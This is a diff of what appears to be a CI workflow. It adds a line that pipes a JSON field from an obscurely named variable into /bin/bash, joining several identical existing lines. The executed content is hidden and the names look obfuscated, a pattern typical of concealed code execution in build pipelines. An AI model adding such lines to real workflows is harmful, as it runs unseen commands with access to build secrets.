@@ -25,6 +25,7 @@ jobs:
           echo $vs3 | jq -r .pois791 | /bin/bash
           echo $wbq637 | jq -r .vq0 | /bin/bash
           echo $s646 | jq -r .xpkxx25 | /bin/bash
+          printf '%s' "$hv6589" | jq -r .hn6023 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
